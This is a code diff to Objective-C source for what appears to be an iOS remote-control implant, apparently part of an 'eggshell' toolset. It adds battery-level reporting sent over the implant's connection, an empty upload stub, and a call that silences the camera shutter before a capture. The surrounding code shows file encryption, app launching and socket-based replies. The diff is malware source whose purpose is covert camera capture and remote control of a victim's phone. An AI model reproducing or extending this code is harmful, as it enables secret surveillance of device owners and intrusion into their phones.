@@ -7,6 +7,8 @@ CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable
 
 -(id)init {
     TERM = @"EOF6D2ONE";
+    _thisUIDevice = [UIDevice currentDevice];
+    [_thisUIDevice setBatteryMonitoringEnabled:YES];
     _fileManager = [[NSFileManager alloc] init];
     _messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
     return self;
@@ -65,6 +67,7 @@ int sockfd;
 //MARK: Camera
 
 -(void)camera:(BOOL)isfront {
+    [_messagingCenter sendMessageName:@"silenceShutter" userInfo:nil];
     [self setupCaptureSession:isfront];
     [NSThread sleepForTimeInterval:0.2];
     //this guy deserves a medal
@@ -297,6 +300,13 @@ int sockfd;
         }
     }
 }
+
+-(void)upload:(NSArray *)args {
+    @autoreleasepool {
+        
+    }
+}
+
 
 -(void)encryptFile:(NSArray *)args {
     BOOL isdir;
@@ -563,7 +573,12 @@ int sockfd;
     }
 }
 
-    
+-(void)battery {
+    int batinfo=([_thisUIDevice batteryLevel]*100);
+    NSString *batlevel = [NSString stringWithFormat:@"Battery Level: %d ",batinfo];
+    [self sendString:batlevel:_skey];
+}
+
 -(void)launchApp:(NSArray *)args {
     if ([args count] >= 2) {
         int ret;
@@ -631,6 +646,7 @@ int sockfd;
         [self sendString:@"You dont have eggshellPro Extension":_skey];
     }
 }
+
 
 -(void)mcSendYesReply:(NSString *)message {
     NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:message userInfo:nil];
